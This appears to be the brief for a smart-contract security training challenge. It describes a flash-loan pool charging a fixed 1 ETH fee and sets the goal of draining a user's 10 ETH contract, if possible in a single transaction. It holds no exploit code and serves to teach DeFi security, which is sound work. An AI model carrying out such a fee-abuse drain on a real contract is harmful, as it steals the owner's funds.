There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.
